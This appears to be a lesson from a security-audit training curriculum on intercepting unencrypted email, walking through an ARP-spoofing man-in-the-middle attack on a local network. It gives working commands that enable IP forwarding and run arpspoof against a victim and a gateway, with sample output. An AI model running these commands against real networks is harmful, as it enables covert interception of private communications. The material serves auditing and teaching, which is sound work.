---
type: ADIDS
id: audit-external-services-mail-unencrypted-messages-instructions-core
...

If the attacker wishes to observe the victim’s email traffic (most likely because she failed to capture an unencrypted password, which would have allowed her to log in as the victim himself and read his email directly), she may need to carry out a second, slightly more complex attack.

To capture outgoing (SMTP) messages, the attack is nearly identical to the password attack described above.

Step 1: The attacker tricks the victim into routing all of his traffic through the attacker’s machine. This involves making a simple request to the victim’s IP address, which is not difficult to do. Computers are rarely configured to ignore such requests.

$ sudo sh -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'
$ sudo arpspoof -i wlan0 -t 192.168.1.99 192.168.1.1

00:11:22:33:44:55 aa:bb:cc:dd:ee:ff 0806 42: arp reply 192.168.1.1 is-at 00:11:22:33:44:55
00:11:22:33:44:55 aa:bb:cc:dd:ee:ff 0806 42: arp reply 192.168.1.1 is-at 00:11:22:33:44:55
00:11:22:33:44:55 aa:bb:cc:dd:ee:ff 0806 42: arp reply 192.168.1.1 is-at 00:11:22:33:44:55
00:11:22:33:44:55 aa:bb:cc:dd:ee:ff 0806 42: arp reply 192.168.1.1 is-at 00:11:22:33:44:55
...
00:11:22:33:44:55 aa:bb:cc:dd:ee:ff 0806 42: arp reply 192.168.1.1 is-at 00:11:22:33:44:55

In the example above, only a single victim (192.168.1.99) is being targeted, but the attack works fine against multiple victims, or even against the entire network. In other words, the attacker does not need to know which IP address (on the office or Internet cafe LAN, for example) belongs to her target. Furthermore, the victim is extremely unlikely to notice any sign that this phase of the attack is taking place.
